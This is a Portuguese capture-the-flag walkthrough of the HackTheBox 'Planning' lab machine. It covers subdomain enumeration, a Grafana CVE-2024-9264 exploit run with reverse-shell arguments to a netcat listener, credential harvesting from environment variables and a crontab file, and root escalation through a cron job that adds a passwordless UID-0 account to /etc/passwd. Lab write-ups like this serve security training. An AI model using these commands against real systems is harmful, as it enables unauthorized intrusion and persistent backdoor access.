#OS : Linux #Difficult : Easy
***
## Info
As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r
***
## Enumeration
Como sempre, começamos fazendo uma varredura de portas no host.
```sh
nmap 10.10.11.68 -Pn -sV -A -oN scann_tcp
```
![[Pasted image 20250516163515.png]]

Como a porta `80` está aberta podemos acessar pela web. Mas ele tenta resolver para `planning.htb`, podemos adicionar aos hosts.
![[Pasted image 20250516163609.png]]

```sh
echo "10.10.11.68\tplanning.htb" >> /etc/hosts
```

Deixei uma enumeração de subdomínio rodando enquanto olhava o site.
```sh
ffuf -u http://planning.htb -H "Host: FUZZ.planning.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -fw 6
```
Não encontrei nada de interessante na página `web` mas descobri um novo subdomínio.
![[Pasted image 20250516170256.png]]

Podemos então adicionar esse subdomínio os nosso arquivo de hosts.
```sh
echo "10.10.11.68\tgrafana.planning.htb" >> /etc/hosts
```
****
## User
Ao acessar o novo subdomínio no navegador, temos uma tela de login para o Grafana `11.0.0`. Podemos usar as credenciais fornecidas no início da lab para logar.
![[Pasted image 20250516171125.png]]

Então procurei por algum `exploit` referente ao Grafana. E encontrei um que em tese seria um `RCE`.
![[Pasted image 20250516171320.png]]

Primeiro executamos um listener na porta em que vamos receber a shell.
```sh
nc -lvnp 4545
```

E depois baixamos e executamos o exploit.
```sh
git clone https://github.com/z3k0sec/CVE-2024-9264-RCE-Exploit.git
cd CVE-2024-9264-RCE-Exploit
python poc.py --url http://grafana.planning.htb --username admin --password 0D5oT70Fq13EvB5r --reverse-ip 10.10.x.x --reverse-port 4545
```

Entramos como `root` e sem uma shell decente, o que indica que estamos em um container ou uma sandbox. Podemos ver as variáveis de ambiente pois containers normalmente tem variáveis de ambiente para guardar configurações.
```sh
printenv
```
![[Pasted image 20250516174941.png]]

Agora que temos um usuário e uma senha, podemos tentar fazer login na máquina com esse usuário.
```sh
ssh enzo@planning.htb
```
![[Pasted image 20250516175116.png]]
***
## Root
Fiz algumas enumerações básicas como permissões `sudo`, `SUID` e `SGID` mas não achei nada. Até que olhei as portas que estão sendo usadas no sistema.
```sh
netstat -ntlp
```
![[Pasted image 20250516175727.png]]

Temos duas portas que costumam ser utilizadas em aplicações, podemos fazer um `port forwarding` para trazer o tráfego para a nossa máquina.
```sh
ssh -L 3000:127.0.0.1:3000 -L 8000:127.0.0.1:8000 enzo@planning.htb
```
![[Pasted image 20250516180132.png]]

Na porta `3000`, temos novamente a tela de login do `Grafana`.
```web
http://127.0.0.1:3000
```
![[Pasted image 20250516180543.png]]

Na porta `8000` temos uma autenticação `HTTP`.
```web
http://127.0.0.1:8000
```
![[Pasted image 20250516180711.png]]

Como não temos nenhum usuário e senha, comecei a vasculhar o host novamente, até que achei um arquivo de `cronjob` em `/opt/crontab/`. Onde tinha uma senha usada no `script` decompactação. 
```sh
cat /opt/crontabs/crontab.db | jq
```
![[Pasted image 20250516180953.png]]

Não temos o nome do usuário, mas pelo nome do arquivo que está sendo compactado, fiz uma suposição de que seria o `root`.
![[Pasted image 20250516181154.png]]

Entramos com sucesso no que parece ser uma aplicação de agendamento de tarefas pelo `crontab`.
![[Pasted image 20250516181253.png]]

Preparei um script em `/home/enzo/exploit.sh` para criar um usuário `root` sem senha.
```sh
#!/bin/bash
echo "root4::0:0:root4:/root:/bin/bash" >> /etc/passwd
```

```sh
chmod +x exploit.sh
```

E criei a tarefa para executa-lo a cada um mês, já que podemos executar a qualquer momento no botão `Run now`.
![[Pasted image 20250516181548.png]]

E então podemos executa-lo
![[Pasted image 20250516181727.png]]

Podemos verificar se o usuário foi criado com sucesso.
```sh
cat /etc/passwd
```
![[Pasted image 20250516182018.png]]

Podemos fazer login no usuário `root4` e verificar se temos acesso ao `/root`
```sh
su root4
ls ~
```
![[Pasted image 20250516182118.png]]
***
![[Pasted image 20250516182139.png]]